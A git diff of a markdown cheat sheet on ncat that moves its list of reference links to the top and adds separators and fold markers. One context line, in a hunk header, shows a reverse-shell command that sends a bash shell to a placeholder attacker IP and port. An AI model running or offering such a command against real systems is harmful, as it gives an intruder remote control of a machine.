@@ -18,6 +18,14 @@ resources:
 
 `ncat` — Reimplementation of netcat maintained by the [Nmap](https://nmap.org/ncat/) team
 
+- [Ncat](https://nmap.org/ncat/)
+- [Ncat Users' Guide](https://nmap.org/ncat/guide/index.html)
+- [ncat - man7.org](https://www.man7.org/linux/man-pages/man1/ncat.1.html)
+- [Netcat - Wikipedia](https://en.wikipedia.org/wiki/Netcat)
+
+___
+
+<!-- Usage {{{-->
 ## Usage
 
 Synopsis
@@ -123,9 +131,5 @@ ncat <attacker_ip> <attacker_port> -e /bin/bash
 ```
 <!-- }}} -->
 
-## Resources
-
-- [Ncat](https://nmap.org/ncat/)
-- [Ncat Users' Guide](https://nmap.org/ncat/guide/index.html)
-- [ncat - man7.org](https://www.man7.org/linux/man-pages/man1/ncat.1.html)
-- [Netcat - Wikipedia](https://en.wikipedia.org/wiki/Netcat)
+___
+<!-- }}} -->
